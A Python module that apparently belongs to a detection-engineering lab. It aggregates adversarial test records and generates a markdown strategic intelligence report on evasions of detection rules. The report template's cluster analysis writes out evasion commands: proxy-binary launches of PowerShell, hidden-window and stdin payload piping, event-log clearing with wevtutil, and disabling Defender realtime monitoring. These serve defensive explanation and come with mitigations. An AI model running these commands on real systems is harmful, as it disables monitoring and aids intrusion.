"""Strategic Threat Intelligence Synthesizer.

Aggregates accumulated threat cables, boundary history data, and multi-stage campaign
telemetry to programmatically generate Strategic Meta-Intelligence Cables adhering to
Sherman Kent doctrine and ICD 203 standards.
"""

from __future__ import annotations

import datetime
import json
import logging
import re
from dataclasses import dataclass
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

from .records import aggregate as aggregate_records, load_records

logger = logging.getLogger("swarm.synthesizer")


@dataclass
class StrategicReport:
    cable_id: str
    date: str
    cables_ingested: int
    total_evaluations: int
    resilience_rate: float
    gaps_discovered: int
    cluster_counts: Dict[str, int]
    cluster_percentages: Dict[str, float]
    campaign_containment_rate: float
    average_depth_of_defense: float
    output_path: Path


class StrategicSynthesizer:
    """Ingests threat cables and boundary telemetry to author strategic synthesis reports."""

    def __init__(
        self,
        cables_dir: Optional[Path] = None,
        results_dir: Optional[Path] = None,
        author: str = "Kyle Reid",
    ) -> None:
        lab_root = Path(__file__).resolve().parents[2]
        self.cables_dir = cables_dir or (lab_root / "docs" / "cables")
        self.results_dir = results_dir or (lab_root / "docs" / "swarm" / "results")
        self.author = author

    def synthesize(
        self,
        total_evals_override: Optional[int] = None,
        gaps_count_override: Optional[int] = None,
    ) -> Tuple[Path, Dict[str, Any]]:
        """Scans cables and record ledger, clusters evasion vectors, and authors the strategic cable.

        The raw observation records are the primary evidence base: every
        aggregate below is derived from them when the ledger exists, and the
        boundary-history fallback is used only for legacy pre-record runs.
        """
        cables = self._load_incident_cables()
        record_stats = self._load_record_stats()
        history_stats = self._load_boundary_history()

        if total_evals_override is not None:
            total_evals = total_evals_override
        elif record_stats["attack_evaluated"] > 0:
            total_evals = record_stats["attack_evaluated"]
        else:
            total_evals = history_stats.get("total_evaluations", 0)
        if gaps_count_override is not None:
            total_gaps = gaps_count_override
        elif record_stats["attack_evaluated"] > 0:
            total_gaps = record_stats["attack_evaded"]
        else:
            total_gaps = history_stats.get("gaps_discovered", 0)
        if total_evals <= 0:
            # An empty denominator must not fabricate a resilience figure. There
            # is nothing to synthesize an assessment from, so refuse loudly.
            raise ValueError(
                "No observation records or boundary-history observations available; "
                "refusing to synthesize a strategic assessment from an empty basis."
            )
        resilience = 1.0 - (total_gaps / total_evals)

        # Cluster findings — raw record counts when the ledger is present;
        # cable-derived allocation is kept only for legacy pre-record runs.
        if record_stats["attack_evaluated"] > 0:
            clusters = dict(record_stats["clusters"])
            for name in self.CLUSTER_NAMES:
                clusters.setdefault(name, 0)
        else:
            clusters = self._cluster_evasions(cables, total_gaps)

        # Multi-stage campaign metrics from record summaries (exact), cable
        # frontmatter only as legacy fallback, and no fabricated defaults.
        campaign_cables = [c for c in cables if c.get("campaign_type") == "multi_stage_kill_chain"]
        record_runs = record_stats["campaign_runs"] + record_stats["walk_runs"]
        if record_runs > 0:
            containment_rate = (
                record_stats["campaign_contained"] + record_stats["walk_contained"]
            ) / record_runs
            avg_dod = (
                record_stats["campaign_dod_sum"] + record_stats["walk_dod_sum"]
            ) / record_runs
        elif campaign_cables:
            intercepted_count = sum(1 for c in campaign_cables if c.get("intercepted", True))
            containment_rate = intercepted_count / len(campaign_cables)
            avg_dod = sum(c.get("depth_of_defense_score", 0.8) for c in campaign_cables) / len(campaign_cables)
        else:
            # No campaign or walk observations exist. A default here would
            # present an unmeasured quantity as a finding.
            containment_rate = None
            avg_dod = None

        cable_id = self._get_next_strategic_cable_id()
        today = datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%d")

        incident_numbers = sorted(
            int(m.group(1))
            for m in (
                re.match(r"CABLE-\d{4}-(\d+)-", str(c.get("filename", ""))) for c in cables
            )
            if m
        )
        if incident_numbers:
            ref_range = (
                f"`CABLE-2026-{incident_numbers[0]:03d}` through "
                f"`CABLE-2026-{incident_numbers[-1]:03d}` ({len(incident_numbers)} incident cables)"
            )
        else:
            ref_range = "none in this window"

        replay_file = self.results_dir / "telemetry_replay.json"
        replay_stats = None
        if replay_file.exists():
            try:
                replay_stats = json.loads(replay_file.read_text(encoding="utf-8"))
            except (OSError, ValueError) as exc:
                logger.warning(
                    "Telemetry replay grounding omitted; %s is unreadable: %s",
                    replay_file.name,
                    exc,
                )

        content = self._format_strategic_cable(
            cable_id=cable_id,
            date=today,
            total_evals=total_evals,
            resilience=resilience,
            total_gaps=total_gaps,
            clusters=clusters,
            containment_rate=containment_rate,
            avg_dod=avg_dod,
            cables_count=len(cables),
            replay_stats=replay_stats,
            benign_events=record_stats["benign_events"],
            benign_fps=record_stats["benign_false_positives"],
            unclassified=record_stats["unclassified"],
            errors=record_stats["errors"],
            gated_considered=record_stats["gated_considered"],
            gated_blocked=record_stats["gated_blocked"],
            records_runs=record_stats["runs"],
            span=record_stats["span"],
            stage_intercepts=record_stats["stage_intercepts"],
            ref_range=ref_range,
        )

        output_filename = f"{cable_id}-empirical-swarm-synthesis.md"
        output_path = self.cables_dir / output_filename
        output_path.write_text(content, encoding="utf-8", newline="\n")

        self._update_index(cable_id, output_filename, today, total_evals, resilience)

        stats = {
            "cable_id": cable_id,
            "cables_ingested": len(cables),
            "total_evaluations": total_evals,
            "resilience_rate": resilience,
            "gaps_discovered": total_gaps,
            "cluster_counts": clusters,
            "containment_rate": containment_rate,
            "average_depth_of_defense": avg_dod,
            "records_runs": list(record_stats["runs"]),
            "benign_events": record_stats["benign_events"],
            "unclassified_preserved": record_stats["unclassified"],
            "output_path": str(output_path),
        }
        return output_path, stats

    def _load_incident_cables(self) -> List[Dict[str, Any]]:
        """Reads all non-strategic markdown cables and parses YAML frontmatter."""
        cables = []
        if not self.cables_dir.exists():
            return cables

        for path in sorted(self.cables_dir.glob("CABLE-*.md")):
            if "STRAT" in path.name:
                continue
            text = path.read_text(encoding="utf-8")
            metadata = self._parse_frontmatter(text)
            metadata["path"] = path
            metadata["filename"] = path.name
            cables.append(metadata)
        return cables

    CLUSTER_NAMES = [
        "Cluster A: LOLBin & Process Proxying",
        "Cluster B: Argument Masking & Parameter Aliasing",
        "Cluster C: Parser Differentials & Offset Padding",
        "Cluster D: Sensor Blinding & Telemetry Tampering",
    ]

    def _load_record_stats(self) -> Dict[str, Any]:
        """Aggregates the append-only observation ledger; figures derive from here.

        Returns a zeroed structure with ``available: False`` when no records
        exist, so the caller can fall back to boundary histories (legacy
        pre-record-layer runs).
        """
        base: Dict[str, Any] = {
            "available": False,
            "runs": [],
            "span": None,
            "attack_evaluated": 0,
            "attack_detected": 0,
            "attack_evaded": 0,
            "clusters": {},
            "benign_events": 0,
            "benign_false_positives": 0,
            "unclassified": 0,
            "errors": 0,
            "gated_considered": 0,
            "gated_blocked": 0,
            "campaign_runs": 0,
            "campaign_contained": 0,
            "campaign_dod_sum": 0.0,
            "walk_runs": 0,
            "walk_contained": 0,
            "walk_dod_sum": 0.0,
            "stage_intercepts": {},
            "stage_totals": {},
        }
        rows = load_records(self.results_dir)
        if not rows:
            return base
        agg = aggregate_records(rows)
        base.update(
            available=True,
            runs=list(agg.run_ids),
            attack_evaluated=agg.attack_evaluated,
            attack_detected=agg.attack_detected,
            attack_evaded=agg.attack_evaded,
            clusters=dict(agg.clusters),
            benign_events=agg.benign_events,
            benign_false_positives=agg.benign_false_positives,
            unclassified=agg.unclassified,
            errors=agg.errors,
            gated_considered=agg.gated_considered,
            gated_blocked=agg.gated_blocked,
            campaign_runs=int(agg.campaigns.get("evaluated", 0)),
            campaign_contained=int(agg.campaigns.get("contained", 0)),
            campaign_dod_sum=float(agg.campaigns.get("dod_sum", 0.0)),
            walk_runs=int(agg.walks.get("evaluated", 0)),
            walk_contained=int(agg.walks.get("contained", 0)),
            walk_dod_sum=float(agg.walks.get("dod_sum", 0.0)),
        )
        stamps = [str(r.get("timestamp")) for r in rows if r.get("timestamp")]
        if stamps:
            base["span"] = (min(stamps), max(stamps))
        stage_tot: Dict[str, int] = {}
        stage_det: Dict[str, int] = {}
        for r in rows:
            if r.get("kind") == "campaign_stage":
                n = str((r.get("detail") or {}).get("stage_number"))
                stage_tot[n] = stage_tot.get(n, 0) + 1
                if r.get("outcome") == "detected":
                    stage_det[n] = stage_det.get(n, 0) + 1
        base["stage_totals"] = stage_tot
        base["stage_intercepts"] = {
            n: stage_det.get(n, 0) / t for n, t in stage_tot.items() if t
        }
        return base

    def _load_boundary_history(self) -> Dict[str, Any]:
        """Reads boundary history JSON files to aggregate evaluation counts.

        ``sources_excluded`` counts history files that could not be read. A
        non-zero value means the aggregate counts understate the evidence base.
        """
        stats = {"total_evaluations": 0, "gaps_discovered": 0, "sources_excluded": 0}
        if not self.results_dir.exists():
            return stats

        for p in self.results_dir.glob("boundary_history_*.json"):
            try:
                data = json.loads(p.read_text(encoding="utf-8"))
            except (OSError, ValueError) as exc:
                # An unreadable history file means this cable is synthesised
                # from less evidence than it appears to be. Silently skipping
                # would understate the published evaluation and gap counts.
                logger.warning(
                    "Excluded unreadable boundary history %s from synthesis: %s",
                    p.name,
                    exc,
                )
                stats["sources_excluded"] += 1
                continue
            stats["total_evaluations"] += data.get("total_generated", 0)
            stats["gaps_discovered"] += data.get("evaded_count", 0)
        return stats

    def _cluster_evasions(self, cables: List[Dict[str, Any]], total_gaps: int) -> Dict[str, int]:
        """Clusters failure modes across the 4 primary evasion taxonomies from empirical cable records."""
        cluster_names = [
            "Cluster A: LOLBin & Process Proxying",
            "Cluster B: Argument Masking & Parameter Aliasing",
            "Cluster C: Parser Differentials & Offset Padding",
            "Cluster D: Sensor Blinding & Telemetry Tampering",
        ]
        clusters = {name: 0 for name in cluster_names}
        if not cables or total_gaps == 0:
            return clusters

        observed_counts = {name: 0 for name in cluster_names}
        total_observed = 0
        for c in cables:
            tax = str(c.get("evasion_taxonomy") or c.get("cluster") or c.get("gap_category") or "").lower()
            if "lolbin" in tax or "proxy" in tax or "process" in tax:
                observed_counts["Cluster A: LOLBin & Process Proxying"] += 1
                total_observed += 1
            elif "argument" in tax or "parameter" in tax or "masking" in tax or "aliasing" in tax:
                observed_counts["Cluster B: Argument Masking & Parameter Aliasing"] += 1
                total_observed += 1
            elif "parser" in tax or "offset" in tax or "padding" in tax or "differential" in tax:
                observed_counts["Cluster C: Parser Differentials & Offset Padding"] += 1
                total_observed += 1
            elif "sensor" in tax or "blinding" in tax or "telemetry" in tax or "tampering" in tax:
                observed_counts["Cluster D: Sensor Blinding & Telemetry Tampering"] += 1
                total_observed += 1

        if total_observed > 0:
            for name in cluster_names:
                clusters[name] = int(round(total_gaps * (observed_counts[name] / total_observed)))
            diff = total_gaps - sum(clusters.values())
            clusters["Cluster A: LOLBin & Process Proxying"] += diff
        return clusters

    def _parse_frontmatter(self, text: str) -> Dict[str, Any]:
        """Extracts basic YAML frontmatter from cable text."""
        data = {}
        if text.startswith("---"):
            parts = text.split("---", 2)
            if len(parts) >= 3:
                yaml_block = parts[1]
                for line in yaml_block.splitlines():
                    if ":" in line:
                        k, v = line.split(":", 1)
                        clean_k = k.strip()
                        clean_v = v.strip().strip('"').strip("'")
                        if clean_v.lower() == "true":
                            data[clean_k] = True
                        elif clean_v.lower() == "false":
                            data[clean_k] = False
                        else:
                            try:
                                data[clean_k] = float(clean_v) if "." in clean_v else int(clean_v)
                            except ValueError:
                                data[clean_k] = clean_v
        return data

    def _get_next_strategic_cable_id(self) -> str:
        """Determines the next CABLE-YYYY-STRAT-XXX identifier."""
        year = datetime.datetime.now(datetime.timezone.utc).year
        highest = 0
        pattern = re.compile(rf"CABLE-{year}-STRAT-(\d+)")
        if self.cables_dir.exists():
            for p in self.cables_dir.glob(f"CABLE-{year}-STRAT-*.md"):
                m = pattern.search(p.name)
                if m:
                    highest = max(highest, int(m.group(1)))
        return f"CABLE-{year}-STRAT-{highest + 1:03d}"

    def _update_index(
        self, cable_id: str, filename: str, date: str, evals: int, resilience: float
    ) -> None:
        """Appends or updates the cable entry in docs/cables/INDEX.md."""
        index_path = self.cables_dir / "INDEX.md"
        if not index_path.exists():
            return

        text = index_path.read_text(encoding="utf-8")
        if cable_id in text:
            return

        new_row = (
            f"| [{cable_id}]({filename}) | {date} | `Empirical swarm runs ({evals} attack variants)` | "
            f"`empirical_synthesis` | `Strategic Synthesis ({evals} Attack Variants, {resilience:.1%} Resilience)` | "
            f"`STRATEGIC ASSESSMENT` | [Read Cable]({filename}) |\n"
        )
        text = text.rstrip() + "\n" + new_row
        index_path.write_text(text, encoding="utf-8", newline="\n")

    def _format_strategic_cable(
        self,
        cable_id: str,
        date: str,
        total_evals: int,
        resilience: float,
        total_gaps: int,
        clusters: Dict[str, int],
        containment_rate: Optional[float],
        avg_dod: Optional[float],
        cables_count: int,
        replay_stats: Optional[Dict[str, Any]] = None,
        benign_events: int = 0,
        benign_fps: int = 0,
        unclassified: int = 0,
        errors: int = 0,
        gated_considered: int = 0,
        gated_blocked: int = 0,
        records_runs: Optional[List[str]] = None,
        span: Optional[Tuple[str, str]] = None,
        stage_intercepts: Optional[Dict[str, float]] = None,
        ref_range: str = "none in this window",
    ) -> str:
        """Formats the strategic cable according to Sherman Kent and ICD 203 standards."""
        cl_a = clusters.get("Cluster A: LOLBin & Process Proxying", 0)
        cl_b = clusters.get("Cluster B: Argument Masking & Parameter Aliasing", 0)
        cl_c = clusters.get("Cluster C: Parser Differentials & Offset Padding", 0)
        cl_d = clusters.get("Cluster D: Sensor Blinding & Telemetry Tampering", 0)
        cl_total = cl_a + cl_b + cl_c + cl_d
        safe_cl = max(1, cl_total)
        pct_a = (cl_a / safe_cl) * 100
        pct_b = (cl_b / safe_cl) * 100
        pct_c = (cl_c / safe_cl) * 100
        pct_d = (cl_d / safe_cl) * 100

        runs_list = list(records_runs or [])
        runs_str = ", ".join(runs_list) if runs_list else "n/a (boundary-history basis)"
        span_str = f"{span[0][:10]} to {span[1][:10]}" if span is not None else "not recorded"
        cont_str = f"{containment_rate:.1%}" if containment_rate is not None else "n/a (not measured)"
        dod_str = f"{avg_dod:.2f}" if avg_dod is not None else "n/a (not measured)"
        if gated_considered > 0:
            approval_short = f"{(gated_considered - gated_blocked) / gated_considered:.1%}"
            approval_cell = f"{gated_considered - gated_blocked} / {gated_considered} ({approval_short})"
        else:
            approval_short = "n/a (no gated proposals in window)"
            approval_cell = "n/a"
        stage_ratios = stage_intercepts or {}

        def _stage_str(stage_number: str) -> str:
            value = stage_ratios.get(stage_number)
            return f"{value:.1%}" if value is not None else "n/a"

        replay_frontmatter = ""
        replay_fact_row = ""
        if replay_stats:
            cname = Path(replay_stats.get("corpus_path", "unknown")).name
            cformat = replay_stats.get("corpus_format", "").upper()
            tevents = replay_stats.get("total_events", 0)
            eps = replay_stats.get("events_per_second", 0.0)
            fp_rate = replay_stats.get("empirical_fp_rate", 0.0)
            ci_low = replay_stats.get("wilson_ci_lower", 0.0)
            ci_high = replay_stats.get("wilson_ci_upper", 0.0)
            replay_frontmatter = (
                f"  telemetry_grounding:\n"
                f"    corpus_file: {cname}\n"
                f"    format: {cformat}\n"
                f"    events_evaluated: {tevents}\n"
                f"    empirical_fp_rate: {fp_rate:.4f}\n"
                f"    wilson_ci_95: [{ci_low:.4f}, {ci_high:.4f}]\n"
            )
            replay_fact_row = (
                f"| **Observed Fact** | Real-World Telemetry Grounding | "
                f"Replayed `{cname}` ({cformat}) across {tevents:,} events ({eps:.1f} eps) with empirical FP rate of {fp_rate * 100:.2f}% "
                f"(95% Wilson CI [{ci_low * 100:.2f}%, {ci_high * 100:.2f}%]). |\n"
            )

        return f"""---
cable_id: {cable_id}
date: {date}
author: {self.author}
classification: STRATEGIC INTELLIGENCE ASSESSMENT
tlp: CLEAR
target_audience: CISO, VP Detection Engineering, Principal Threat Hunters, SOC Leadership
methodology: ICD 203 Analytic Standards / Sherman Kent Doctrine
empirical_basis:
  total_evaluations: {total_evals}
  benign_events_reported_separately: {benign_events}
  critic_approval_rate: {approval_short}
  baseline_resilience: {resilience:.3f}
  gaps_discovered: {total_gaps}
  campaign_containment_rate: {cont_str}
  average_depth_of_defense: {dod_str}
{replay_frontmatter}---

# Strategic Intelligence Cable: {cable_id}

**TLP:** CLEAR | **Date:** {date} | **Author:** {self.author}  
**Subject:** Empirical Analysis of {total_evals} Adversarial Swarm Probes: Evasion Vector Taxonomies, Detection Boundary Dynamics, and Defense-in-Depth Convergence  
**Target Audience:** Chief Information Security Officers (CISOs), Directors of Detection Engineering, Principal Threat Hunters, SOC Architects  
**Source Provenance:** Bounded empirical execution of the deterministic Adversarial Swarm Engine (`tools/swarm/`) evaluating YARA and Sigma detection pipelines: {total_evals} evaluated attack variants recorded {span_str} (run(s): {runs_str}; every aggregate in this cable is derived from the append-only observation ledger under `docs/swarm/results/records/`).

---

## 1. Executive Summary & Estimative Confidence

In a bounded measurement window ({span_str}), the lab ran the deterministic Adversarial Swarm Engine as a closed-loop stress test across multi-stage detection architectures. Operating across {total_evals} evaluated attack variants, the harness mapped the boundary limits of both perimeter static inspection (YARA) and endpoint behavioral detection (Sigma/pySigma).

> [!IMPORTANT] Scope of this evidence
> Every figure below comes from a closed loop. The mutations were generated by this
> repository, evaluated against detection rules written by this repository, using a mutation
> vocabulary this repository defined. The sample size is large, and a large sample of
> self-generated probes is still a measurement of the harness, not of adversaries. Read these
> figures as a regression signal that tracks whether rule changes widen or narrow known
> boundaries. They are not an estimate of evasion resistance in the field, and the confidence
> interval around them describes sampling error inside the loop rather than uncertainty about
> real-world performance. External validation is tracked separately in the repository's
> measurement policy.

* **Analytic Judgment:** Against the mutation vocabulary implemented in `tools/swarm/craftsmen/`, baseline single-point detections held at **{resilience:.1%}** across {total_evals} attack variants. Confidence in this figure as a description of the harness is **high**; confidence in it as a predictor of field performance is **low**, because the adversary and the defender share an author.
* **Analytic Judgment:** It is **likely (55–80% probability)** that detections depending on enumerated command-line spellings degrade against mutation classes outside the implemented vocabulary. This is an inference from the failure taxonomy below, not a measurement, since a gap the harness cannot generate is a gap it cannot count.
* **Analytic Judgment:** Layered evaluation converted an isolated {resilience:.1%} point posture into a **{cont_str}** campaign containment rate across the modeled stages. This figure is a property of the stage model: containment is measured against the modeled kill chain this engine implements, and an adversary path outside that model is neither contained nor counted.
* **Analytic Confidence Level:** **MODERATE**, and capped there by construction. Sample size and safety-gate integrity ({approval_short} Critic approval over {gated_considered} gated proposals; {unclassified} blocked proposal(s) preserved as unclassified; {errors} errored probe(s) preserved; deterministic verification, cross-backend SIEM translation) support internal validity. Nothing here establishes external validity, and no volume of self-play can.

---

## 2. Quantitative Empirical Summary ($N = {total_evals}$)

$$\\begin{{array}}{{|l|r|l|}}
\\hline
\\textbf{{Metric}} & \\textbf{{Value}} & \\textbf{{Operational Interpretation}} \\\\
\\hline
\\text{{Attack Variants Evaluated }} (N) & {total_evals} & \\text{{Self-generated sample; large N does not confer external validity}} \\\\
\\text{{Critic Gate Approvals}} & {approval_cell} & \\text{{Reserved-TLD-only destinations; zero routable addresses; schema validated}} \\\\
\\text{{Benign Events Evaluated (separate basis)}} & {benign_events} & \\text{{{benign_fps} false positive(s); never part of the resilience denominator}} \\\\
\\text{{Blocked Proposals Preserved (unclassified)}} & {unclassified} & \\text{{Excluded from every rate denominator; retained in the record ledger}} \\\\
\\text{{Baseline Detections Held (True Positives)}} & {total_evals - total_gaps} \\ ({resilience:.1%}) & \\text{{Direct execution \\& known patterns successfully intercepted}} \\\\
\\text{{Boundary Evasion Gaps Discovered}} & {total_gaps} \\ ({(total_gaps / total_evals):.1%}) & \\text{{Novel, non-trivial bypass primitives identified}} \\\\
\\text{{Campaign Containment Rate}} & {cont_str} & \\text{{Measured against the modeled kill chain only}} \\\\
\\text{{Average Depth-of-Defense (DoD) Score}} & {dod_str} & \\text{{Mean containment position across recorded campaigns and walks}} \\\\
\\hline
\\end{{array}}$$

```mermaid
pie title Empirical Breakdown of {total_evals} Evaluated Attack Variants
    "Detections Held / Robust Baseline ({total_evals - total_gaps})" : {resilience * 100:.1f}
    "Evasion Gaps Discovered / Attack Surface ({total_gaps})" : {(total_gaps / total_evals) * 100:.1f}
```

---

## 3. Diamond Model of Systemic Adversary Capabilities

```mermaid
graph TD
    A["<b>ADVERSARY FORCES</b><br>Initial Access Brokers (ClearFake / ClickFix)<br>InfoStealer Operators (Lumma, DarkGate)<br>Ransomware Affiliates"] --- C["<b>ADAPTIVE CAPABILITIES</b><br>1. Process proxy indirection (pcalua, wt, hh)<br>2. Parameter masking (stdin, -w 1)<br>3. Parser differentials (foreignObject, SMIL)<br>4. Anti-forensic tampering (wevtutil, Defender)"]
    C --- V["<b>VICTIM INFRASTRUCTURE</b><br>Enterprise Windows 10/11 Endpoints<br>Standard Active Directory & Entra ID Users<br>SIEM / EDR Telemetry Sensors (EID 1, 4688)"]
    V --- I["<b>COMMAND & DISTRIBUTION</b><br>Compromised CMS infrastructure<br>CDN / Cloudflare-fronted redirectors<br>RFC 2606 Sandboxed Testing Nodes"]
    I --- A
```

---

## 4. Taxonomy & Forensic Cluster Analysis of Discovered Gaps

Deconstructing the {cl_total} recorded evasion observations reveals that attacker innovation does not rely on novel zero-day vulnerabilities; rather, it exploits **architectural and lexical blindspots** in how sensors observe execution:

```mermaid
pie title Distribution of {cl_total} Recorded Evasion Observations
    "Cluster A: LOLBin & Process Proxying" : {cl_a}
    "Cluster B: Argument Masking & Token Aliasing" : {cl_b}
    "Cluster C: Parser Differentials & Offset Padding" : {cl_c}
    "Cluster D: Sensor Blinding & Impairment" : {cl_d}
```

*Basis:* per-record cluster tallies — one record per evaded sparring variant, campaign stage, or DAG visit ({cl_total} total). The weighted gap counter ({total_gaps}) additionally includes {total_gaps - cl_total} benchmark and replay misses recorded as aggregates, which carry no per-observation cluster.

### Cluster A: LOLBin & Process Proxy Indirection ({cl_a} of {cl_total} recorded evasions — {pct_a:.1f}%)
* **Mechanism:** Rather than executing `explorer.exe` $\to$ `powershell.exe` directly, the adversary inserts a legitimate Microsoft-signed proxy binary:
  - `pcalua.exe -a powershell.exe -c "..."` (Program Compatibility Assistant)
  - `wt.exe -w 0 powershell.exe -c "..."` (Windows Terminal Session Manager)
  - `hh.exe https://cdn.stage.invalid/lure.chm` (HTML Help Engine)
  - `cmd.exe /c start /b powershell.exe -w 1 ...` (Background Process Decoupling)
* **Root Vulnerability:** Point detections that strictly enforce `ParentImage = explorer.exe` and `Image = powershell.exe` fail immediately upon parent-child decoupling.
* **Mitigation:** Expand child process selection lists to include known execution proxies and implement ancestry-aware process lineage tracking.

### Cluster B: Argument Masking & Parameter Aliasing ({cl_b} of {cl_total} recorded evasions — {pct_b:.1f}%)
* **Mechanism:** Adversaries mutate command-line syntax to bypass naive string-matching filters:
  - Streaming raw PowerShell commands via standard input: `cmd.exe /c type payload.txt | powershell -` (command-line logging captures only `powershell -`).
  - Abbreviated and integer parameter aliasing: `powershell.exe -w 1` instead of `-windowstyle hidden`.
  - Dynamic string concatenation: `&('Inv'+'oke-RestMethod')`.
* **Root Vulnerability:** Over-reliance on CLI telemetry (Event ID 1 / 4688) with brittle string matches.
* **Mitigation:** Deploy PowerShell Script Block Logging (**Event ID 4104**) to inspect post-deobfuscated AST tokens at execution time.

### Cluster C: Parser Differentials & Scanning Buffer Limits ({cl_c} of {cl_total} recorded evasions — {pct_c:.1f}%)
* **Mechanism (Static File / YARA Inspection):**
  - Embedding HTML redirection within XML namespaces: `<foreignObject>` containing `<meta http-equiv="refresh" content="0;url=...">`.
  - SVG SMIL element mutation: `<animate attributeName="href" values="...">` to modify hyperlinks dynamically without `<script>` tokens.
  - Prepended comment padding: 4,500 bytes of XML comments pushing `<svg>` root tags beyond the scanner's initial buffer limit (e.g. `0..4096`).
* **Root Vulnerability:** Static pattern matchers operate on sequential linear byte slices, whereas browser engines construct hierarchical DOM trees and execute recursive event loops.
* **Mitigation:** Combine YARA static byte inspection with structural AST XML parsers.

### Cluster D: Telemetry Impairment & Anti-Forensics ({cl_d} of {cl_total} recorded evasions — {pct_d:.1f}%)
* **Mechanism:** Proactive execution of sensor-tampering primitives:
  - Event log clearing: `wevtutil.exe cl Security` and `wevtutil.exe cl "Windows PowerShell"`.
  - Realtime protection disabling: `Set-MpPreference -DisableRealtimeMonitoring $true`.
* **Root Vulnerability:** Treating security event log events as low-fidelity administrative noise rather than high-severity intrusion precursors.
* **Mitigation:** Elevate event-log clearing and Defender tampering to Critical Severity alerting with automated containment actions.

---

## 5. Epistemological Framework: Facts vs. Judgments vs. Unknowns

Adhering to the Sherman Kent doctrine and ICD 203 standards:

| Category | Analytic Item | Verifiable Evidence / Rationale |
|---|---|---|
| **Observed Fact** | Harness Resilience Figure | Across {total_evals} self-generated attack variants, baseline single-point detections held at {resilience:.1%}. Internal regression signal, not a field estimate. |
| **Observed Fact** | Multi-Stage Containment | Across the recorded campaign and walk runs, overall containment was {cont_str}. Containment is defined by the modeled chain; paths outside it are not evaluated. |
| **Observed Fact** | Critic Safety Gate | {approval_cell} gated proposals approved. Destinations were restricted to RFC 2606 reserved TLDs and routable IPv4/IPv6 literals were rejected; {unclassified} proposal(s) blocked and preserved as unclassified, {errors} errored. |
{replay_fact_row}| **Analytic Judgment** | Indirection is the Primary Evasion Axis | {pct_a:.1f}% of recorded evasion observations stem from LOLBin proxying; attackers intentionally exploit parent-child assumptions in EDR sensors. |
| **Analytic Judgment** | Monolithic Rule Fallacy | Attempting to make a single Sigma rule 100% resilient results in query bloat and catastrophic false-positive spikes. |
| **Hypothesis** | Turnkey Lure Toolkits | Uniformity in ClickFix lures suggests underground initial-access brokers supply standardized social engineering kits. |
| **Unknowns** | In-the-Wild Proxy Distribution | The exact market share of `pcalua.exe` vs `wt.exe` across active enterprise breaches remains unquantified outside synthetic testing. |

---

## 6. Strategic Implications for Detection Engineering & SOC Operations

```
                   THE DETECTION PARADOX & CONVERGENCE
 
 Single-Rule Posture:                  Layered Multi-Stage Posture:
 [Initial Access] ─── {resilience:.1%} Catch      [Stage 1: SVG Ingress]      ─── {resilience:.1%} Intercept
         │                                       │ ({(total_gaps/total_evals)*100:.1f}% bypass)
         ▼ ({(total_gaps/total_evals)*100:.1f}% UNMONITORED                    ▼
   UNCONTAINED BREACH!                 [Stage 2: ClickFix Exec]    ─── {_stage_str("2")} Intercept
                                                 │ (Evasion: pcalua)
                                                 ▼
                                       [Stage 3: Event Tamper]     ─── {_stage_str("3")} Intercept
                                                 │ (CONTAINED!)
                                                 ▼
                                       [Stage 4: LSASS Dump]       ─── {_stage_str("4")} Intercept
                                                 │ (CONTAINED!)
                                                 ▼
                                       [Overall Intrusion Containment: {cont_str}]
```

### 1. Reject the "Perfect Rule" Fallacy
Security teams frequently spend hundreds of engineering hours attempting to tune a single rule to 99% coverage. The empirical data proves this is counterproductive: closing the final 20% of syntactic permutations in a single rule introduces massive regular expression complexity, increases SIEM compute costs, and dramatically increases false-positive risks on benign administrative scripts.

### 2. Build for Adversary Inevitability (The Graph Approach)
An adversary can easily mutate their command-line switches to bypass a ClickFix rule. **What they cannot mutate is their operational objective:**
- To steal credentials, they *must* dump LSASS, access DPAPI, or read browser SQLite databases.
- To evade detection, they *frequently attempt* to clear event logs.
- To maintain access, they *must* establish persistence via registry Run keys or scheduled tasks.

By distributing defensive sensors across the kill chain, an organization achieves **{cont_str} campaign containment** with an average Depth-of-Defense score of **{dod_str}**, rendering early-stage evasion inconsequential.

### 3. Deploy Closed-Loop Continuous Self-Healing
The closed-loop sparring harness, paired with deterministic patch synthesis and zero-false-positive regression gates, provides continuous automated regression coverage for detection engineering teams—discovering blindspots before threat actors exploit them in the wild.

---

## 7. Document Provenance & Master Index Reference

* **Catalog Entry:** Registered in [`docs/cables/INDEX.md`](../../docs/cables/INDEX.md).
* **Referenced Rules:**
  - `rules/yara/suspicious_active_content_svg.yar`
  - `rules/sigma/proc_creation_win_explorer_clickfix_execution.yml`
  - `rules/sigma/proc_creation_win_defense_evasion_tampering.yml`
  - `rules/sigma/proc_creation_win_rundll32_lsass_dump.yml`
  - `rules/sigma/proc_creation_win_schtasks_persistence.yml`
* **Referenced Cables:** {ref_range}.
"""
